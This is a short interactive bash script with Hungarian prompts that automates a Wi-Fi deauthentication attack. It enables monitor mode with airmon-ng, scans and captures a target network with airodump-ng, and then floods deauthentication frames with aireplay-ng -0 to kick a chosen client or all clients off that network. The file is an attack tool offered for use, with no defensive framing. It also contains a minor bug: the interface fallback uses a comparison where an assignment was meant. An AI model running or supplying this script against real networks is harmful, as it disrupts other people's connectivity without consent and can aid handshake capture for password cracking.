#!/bin/bash
iwconfig
echo "Melyik ezközt akarod használni a kirugásra?"
echo "A géptől függően lehet hogy az ezköz neve változni fog."
read iface
sudo airmon-ng start $iface
sleep 1
iwconfig
echo "Mi az ezköz új neve?"
read ifacemon
    if [[ $ifacemon == "" ]]; then
        ifacemon == $iface
    fi
echo "Amikor kiválasztottad a hálózatot, Ctrl+C"
sudo airodump-ng -M $ifacemon
echo "Hálozat BSSID (MAC cím)"
read bssid
echo "Hálózat csatorna (ch)"
read channel
sleep 1
sudo airodump-ng --bssid $bssid -c $channel -w $bssid $ifacemon
echo "Készülék MAC cím"
read mac
echo "Kirugás száma"
read num
if [[ $mac == "" ]]; then
    sudo aireplay-ng -0 $num -a $bssid $ifacemon
else
    sudo aireplay-ng -0 $num -a $bssid -c $mac $ifacemon
fi